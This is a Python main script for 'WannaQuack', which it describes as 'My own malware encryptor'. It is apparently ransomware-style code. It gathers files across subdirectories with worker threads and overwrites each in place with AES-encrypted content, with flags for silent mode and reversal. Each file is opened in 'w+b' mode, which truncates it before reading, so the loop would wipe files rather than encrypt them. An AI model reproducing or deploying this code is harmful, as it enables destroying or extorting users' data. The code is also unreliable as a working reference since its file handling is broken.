import argparse
from WannaQuack import WannaQuack
from Worker import Worker
from concurrent.futures import ThreadPoolExecutor, as_completed


def init_parser():
    
    parser = argparse.ArgumentParser(description="My own malware encryptor")
    parser.add_argument('-v', "--version", action="store_true", help="Show version information")
    parser.add_argument('-r', "--reverse", action="store_true", help="Reverse the encryption process")
    parser.add_argument('-s', "--silent", action="store_true", help="Silent mode, no output")
    # parser.add_argument('-h', "--help", action="store_true", help="Show help information")
    return parser


def main():
  parser = init_parser()
  args = parser.parse_args()

  if args.version:
        print("Version 1.0.0")
        exit()
  elif args.reverse:
      print("Reversing encryption process...")
  elif args.silent:
      pass  # silent mode
  # else:
  #     parser.print_help()
  #     exit(1)
  
  prog = WannaQuack(args)
  prog.take_position()


  futures = [prog.executor.submit(Worker().run, dir) for dir in prog.subdir]
  
  for f in as_completed(futures):
    files = f.result()
    prog.files_path.update(files)

  prog.init_aes()
  for files in prog.files_path:
    with open(files, "w+b") as f:
      data = f.read()
      new_content = prog.decrypt(data) if args.reverse else prog.encrypt(data) 
      f.seek(0)
      f.write(new_content)



if __name__ == "__main__":
  main()